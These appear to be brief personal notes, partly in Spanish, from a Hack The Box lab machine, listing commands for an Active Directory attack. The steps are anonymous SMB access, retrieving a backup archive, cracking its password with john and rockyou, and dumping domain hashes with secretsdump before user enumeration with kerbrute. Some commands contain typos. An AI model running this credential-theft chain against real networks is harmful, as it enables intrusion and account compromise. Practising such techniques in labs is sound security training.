smbclient -L apt -N (backup)
smbclient //apt/backup -N

get backup.zip 
7z l backup.zip -> ver contenido

SYSTEM + SAM = hashes de usuarios LOCALES

SYSTEM + NTDS -> secretsdump

Listar todos los hashes de los usuarios del AD

zip2john backup.zip > hash

john -w:$(localte rockyou.txt | tail -n 1) hash

unzip + Password

impacket-secretsdump -system registry/SYSTEM -ntds Active Directory/ntds.dit LOCAL > hashes

cat hashes | grep "..." | sponge hashes 

cat hashes | awk '{print $1}' FS=":" > Users

cat hashes | awk '{print $4}' FS":" | sponge hashes

kerbrute userenum --dc apt -d htb.local users
